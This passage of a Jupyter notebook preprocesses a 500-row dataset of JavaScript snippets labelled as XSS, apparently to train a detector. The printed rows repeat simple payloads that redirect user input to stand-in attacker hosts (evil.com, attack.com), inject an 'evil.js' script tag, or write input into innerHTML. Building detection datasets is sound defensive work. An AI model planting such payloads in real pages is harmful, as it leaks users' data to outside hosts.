       "      <th>Vulnerability Type</th>\n",
       "      <th>Location</th>\n",
       "      <th>Preprocessed Tokens</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "      <td>19</td>\n",
       "      <td>[\"alert('Hello\", \"'\", '+', 'user_input);']</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>document.location = 'http://evil.com?username=...</td>\n",
       "      <td>XSS</td>\n",
       "      <td>2</td>\n",
       "      <td>['document.location', '=', \"'http://evil.com?u...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>document.location = 'http://evil.com?username=...</td>\n",
       "      <td>XSS</td>\n",
       "      <td>10</td>\n",
       "      <td>['document.location', '=', \"'http://evil.com?u...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>document.getElementById('input').innerHTML = u...</td>\n",
       "      <td>XSS</td>\n",
       "      <td>10</td>\n",
       "      <td>[\"document.getElementById('input').innerHTML\",...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "      <td>16</td>\n",
       "      <td>[\"alert('Hello\", \"'\", '+', 'user_input);']</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>495</th>\n",
       "      <td>document.getElementById('input').innerHTML = u...</td>\n",
       "      <td>XSS</td>\n",
       "      <td>4</td>\n",
       "      <td>[\"document.getElementById('input').innerHTML\",...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>496</th>\n",
       "      <td>document.location = 'http://evil.com?username=...</td>\n",
       "      <td>XSS</td>\n",
       "      <td>6</td>\n",
       "      <td>['document.location', '=', \"'http://evil.com?u...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>497</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "      <td>11</td>\n",
       "      <td>[\"alert('Hello\", \"'\", '+', 'user_input);']</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>498</th>\n",
       "      <td>window.location.href = 'http://attack.com?user...</td>\n",
       "      <td>XSS</td>\n",
       "      <td>14</td>\n",
       "      <td>['window.location.href', '=', \"'http://attack....</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>499</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "      <td>16</td>\n",
       "      <td>[\"alert('Hello\", \"'\", '+', 'user_input);']</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>500 rows × 4 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                          Code Snippet Vulnerability Type  \\\n",
       "0                        alert('Hello ' + user_input);                XSS   \n",
       "1    document.location = 'http://evil.com?username=...                XSS   \n",
       "2    document.location = 'http://evil.com?username=...                XSS   \n",
       "3    document.getElementById('input').innerHTML = u...                XSS   \n",
       "4                        alert('Hello ' + user_input);                XSS   \n",
       "..                                                 ...                ...   \n",
       "495  document.getElementById('input').innerHTML = u...                XSS   \n",
       "496  document.location = 'http://evil.com?username=...                XSS   \n",
       "497                      alert('Hello ' + user_input);                XSS   \n",
       "498  window.location.href = 'http://attack.com?user...                XSS   \n",
       "499                      alert('Hello ' + user_input);                XSS   \n",
       "\n",
       "     Location                                Preprocessed Tokens  \n",
       "0          19         [\"alert('Hello\", \"'\", '+', 'user_input);']  \n",
       "1           2  ['document.location', '=', \"'http://evil.com?u...  \n",
       "2          10  ['document.location', '=', \"'http://evil.com?u...  \n",
       "3          10  [\"document.getElementById('input').innerHTML\",...  \n",
       "4          16         [\"alert('Hello\", \"'\", '+', 'user_input);']  \n",
       "..        ...                                                ...  \n",
       "495         4  [\"document.getElementById('input').innerHTML\",...  \n",
       "496         6  ['document.location', '=', \"'http://evil.com?u...  \n",
       "497        11         [\"alert('Hello\", \"'\", '+', 'user_input);']  \n",
       "498        14  ['window.location.href', '=', \"'http://attack....  \n",
       "499        16         [\"alert('Hello\", \"'\", '+', 'user_input);']  \n",
       "\n",
       "[500 rows x 4 columns]"
      ]
     },
     "execution_count": 741,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_code_vul.reset_index(drop=True, inplace=True)\n",
    "xss_code_vul"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 742,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/4006101678.py:1: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  xss_code_vul.drop(columns= [\"Location\", \"Preprocessed Tokens\"], inplace=True)\n"
     ]
    },
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "Code Snippet",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "Vulnerability Type",
         "rawType": "object",
         "type": "string"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "5b07062b-f0d1-41eb-8ab0-00b1350802fe",
       "rows": [
        [
         "0",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "1",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "2",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "3",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "4",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "5",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS"
        ],
        [
         "6",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS"
        ],
        [
         "7",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "8",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "9",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "10",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "11",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "12",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "13",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "14",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "15",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "16",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "17",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "18",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "19",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "20",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "21",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "22",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "23",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "24",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "25",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "26",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "27",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "28",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "29",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "30",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "31",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "32",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "33",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "34",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "35",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS"
        ],
        [
         "36",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "37",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "38",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "39",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "40",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "41",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "42",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "43",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "44",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "45",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "46",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS"
        ],
        [
         "47",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS"
        ],
        [
         "48",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "49",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 500
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Code Snippet</th>\n",
       "      <th>Vulnerability Type</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>document.location = 'http://evil.com?username=...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>document.location = 'http://evil.com?username=...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>document.getElementById('input').innerHTML = u...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>495</th>\n",
       "      <td>document.getElementById('input').innerHTML = u...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>496</th>\n",
       "      <td>document.location = 'http://evil.com?username=...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>497</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>498</th>\n",
       "      <td>window.location.href = 'http://attack.com?user...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>499</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>500 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                          Code Snippet Vulnerability Type\n",
       "0                        alert('Hello ' + user_input);                XSS\n",
       "1    document.location = 'http://evil.com?username=...                XSS\n",
       "2    document.location = 'http://evil.com?username=...                XSS\n",
       "3    document.getElementById('input').innerHTML = u...                XSS\n",
       "4                        alert('Hello ' + user_input);                XSS\n",
       "..                                                 ...                ...\n",
       "495  document.getElementById('input').innerHTML = u...                XSS\n",
       "496  document.location = 'http://evil.com?username=...                XSS\n",
       "497                      alert('Hello ' + user_input);                XSS\n",
       "498  window.location.href = 'http://attack.com?user...                XSS\n",
       "499                      alert('Hello ' + user_input);                XSS\n",
       "\n",
       "[500 rows x 2 columns]"
      ]
     },
     "execution_count": 742,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_code_vul.drop(columns= [\"Location\", \"Preprocessed Tokens\"], inplace=True)\n",
    "xss_code_vul"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 743,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/1958319171.py:1: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  xss_code_vul.rename(columns={\"Vulnerability Type\": \"xss\", \"Code Snippet\": \"payload\"}, inplace=True)\n"
     ]
    },
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "object",
         "type": "string"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "73409c93-0479-4596-b40e-f55670833596",
       "rows": [
        [
         "0",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "1",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "2",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "3",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "4",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "5",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS"
        ],
        [
         "6",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS"
        ],
        [
         "7",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "8",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "9",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "10",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "11",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "12",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "13",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "14",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "15",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "16",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "17",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "18",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "19",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "20",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "21",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "22",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "23",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "24",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "25",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "26",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "27",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "28",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "29",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "30",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "31",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "32",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "33",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "34",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "35",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS"
        ],
        [
         "36",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "37",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "38",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "39",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "40",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS"
        ],
        [
         "41",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "42",
         "alert('Hello ' + user_input);",
         "XSS"
        ],
        [
         "43",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "44",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "45",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS"
        ],
        [
         "46",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS"
        ],
        [
         "47",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS"
        ],
        [
         "48",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS"
        ],
        [
         "49",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 500
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>document.location = 'http://evil.com?username=...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>document.location = 'http://evil.com?username=...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>document.getElementById('input').innerHTML = u...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>495</th>\n",
       "      <td>document.getElementById('input').innerHTML = u...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>496</th>\n",
       "      <td>document.location = 'http://evil.com?username=...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>497</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>498</th>\n",
       "      <td>window.location.href = 'http://attack.com?user...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>499</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>500 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                               payload  xss\n",
       "0                        alert('Hello ' + user_input);  XSS\n",
       "1    document.location = 'http://evil.com?username=...  XSS\n",
       "2    document.location = 'http://evil.com?username=...  XSS\n",
       "3    document.getElementById('input').innerHTML = u...  XSS\n",
       "4                        alert('Hello ' + user_input);  XSS\n",
       "..                                                 ...  ...\n",
       "495  document.getElementById('input').innerHTML = u...  XSS\n",
       "496  document.location = 'http://evil.com?username=...  XSS\n",
       "497                      alert('Hello ' + user_input);  XSS\n",
       "498  window.location.href = 'http://attack.com?user...  XSS\n",
       "499                      alert('Hello ' + user_input);  XSS\n",
       "\n",
       "[500 rows x 2 columns]"
      ]
     },
     "execution_count": 743,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_code_vul.rename(columns={\"Vulnerability Type\": \"xss\", \"Code Snippet\": \"payload\"}, inplace=True)\n",
    "xss_code_vul"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 744,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "                                               payload  xss\n",
      "0                        alert('Hello ' + user_input);  XSS\n",
      "1    document.location = 'http://evil.com?username=...  XSS\n",
      "2    document.location = 'http://evil.com?username=...  XSS\n",
      "3    document.getElementById('input').innerHTML = u...  XSS\n",
      "4                        alert('Hello ' + user_input);  XSS\n",
      "..                                                 ...  ...\n",
      "495  document.getElementById('input').innerHTML = u...  XSS\n",
      "496  document.location = 'http://evil.com?username=...  XSS\n",
      "497                      alert('Hello ' + user_input);  XSS\n",
      "498  window.location.href = 'http://attack.com?user...  XSS\n",
      "499                      alert('Hello ' + user_input);  XSS\n",
      "\n",
      "[500 rows x 2 columns]\n"
     ]
    }
   ],
   "source": [
    "print(xss_code_vul)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 745,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/680709206.py:1: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  xss_code_vul[\"xss\"] = xss_code_vul['xss'].apply(lambda x: 1 if x == \"XSS\" else 0)\n"
     ]
    },
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "7bb5997c-52c3-424a-a39d-08d50af48712",
       "rows": [
        [
         "0",
         "alert('Hello ' + user_input);",
         "1"
        ],
        [
         "1",
         "document.location = 'http://evil.com?username=' + user_input;",
         "1"
        ],
        [
         "2",
         "document.location = 'http://evil.com?username=' + user_input;",
         "1"
        ],
        [
         "3",
         "document.getElementById('input').innerHTML = user_input;",
         "1"
        ],
        [
         "4",
         "alert('Hello ' + user_input);",
         "1"
        ],
        [
         "5",
         "document.write('<script src=\"evil.js\"></script>');",
         "1"
        ],
        [
         "6",
         "document.write('<script src=\"evil.js\"></script>');",
         "1"
        ],
        [
         "7",
         "document.getElementById('input').innerHTML = user_input;",
         "1"
        ],
        [
         "8",
         "document.getElementById('input').innerHTML = user_input;",
         "1"
        ],
        [
         "9",
         "document.getElementById('input').innerHTML = user_input;",
         "1"
        ],
        [
         "10",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "1"
        ],
        [
         "11",
         "document.location = 'http://evil.com?username=' + user_input;",
         "1"
        ],
        [
         "12",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "1"
        ],
        [
         "13",
         "document.location = 'http://evil.com?username=' + user_input;",
         "1"
        ],
        [
         "14",
         "document.getElementById('input').innerHTML = user_input;",
         "1"
        ],
        [
         "15",
         "document.getElementById('input').innerHTML = user_input;",
         "1"
        ],
        [
         "16",
         "document.location = 'http://evil.com?username=' + user_input;",
         "1"
        ],
        [
         "17",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "1"
        ],
        [
         "18",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "1"
        ],
        [
         "19",
         "document.getElementById('input').innerHTML = user_input;",
         "1"
        ],
        [
         "20",
         "alert('Hello ' + user_input);",
         "1"
        ],
        [
         "21",
         "document.location = 'http://evil.com?username=' + user_input;",
         "1"
        ],
        [
         "22",
         "document.location = 'http://evil.com?username=' + user_input;",
         "1"
        ],
        [
         "23",
         "alert('Hello ' + user_input);",
         "1"
        ],
        [
         "24",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "1"
        ],
        [
         "25",
         "alert('Hello ' + user_input);",
         "1"
        ],
        [
         "26",
         "document.location = 'http://evil.com?username=' + user_input;",
         "1"
        ],
        [
         "27",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "1"
        ],
        [
         "28",
         "alert('Hello ' + user_input);",
         "1"
        ],
        [
         "29",
         "alert('Hello ' + user_input);",
         "1"
        ],
        [
         "30",
         "document.location = 'http://evil.com?username=' + user_input;",
         "1"
        ],
        [
         "31",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "1"
        ],
        [
         "32",
         "document.location = 'http://evil.com?username=' + user_input;",
         "1"
        ],
        [
         "33",
         "document.getElementById('input').innerHTML = user_input;",
         "1"
        ],
        [
         "34",
         "document.getElementById('input').innerHTML = user_input;",
         "1"
        ],
        [
         "35",
         "document.write('<script src=\"evil.js\"></script>');",
         "1"
        ],
        [
         "36",
         "document.getElementById('input').innerHTML = user_input;",
         "1"
        ],
        [
         "37",
         "document.getElementById('input').innerHTML = user_input;",
         "1"
        ],
        [
         "38",
         "alert('Hello ' + user_input);",
         "1"
        ],
        [
         "39",
         "document.getElementById('input').innerHTML = user_input;",
         "1"
        ],
        [
         "40",
         "document.getElementById('input').innerHTML = user_input;",
         "1"
        ],
        [
         "41",
         "document.location = 'http://evil.com?username=' + user_input;",
         "1"
        ],
        [
         "42",
         "alert('Hello ' + user_input);",
         "1"
        ],
        [
         "43",
         "document.location = 'http://evil.com?username=' + user_input;",
         "1"
        ],
        [
         "44",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "1"
        ],
        [
         "45",
         "document.location = 'http://evil.com?username=' + user_input;",
         "1"
        ],
        [
         "46",
         "document.write('<script src=\"evil.js\"></script>');",
         "1"
        ],
        [
         "47",
         "document.write('<script src=\"evil.js\"></script>');",
         "1"
        ],
        [
         "48",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "1"
        ],
        [
         "49",
         "document.write('<script src=\"evil.js\"></script>');",
         "1"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 500
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>document.location = 'http://evil.com?username=...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>document.location = 'http://evil.com?username=...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>document.getElementById('input').innerHTML = u...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>495</th>\n",
       "      <td>document.getElementById('input').innerHTML = u...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
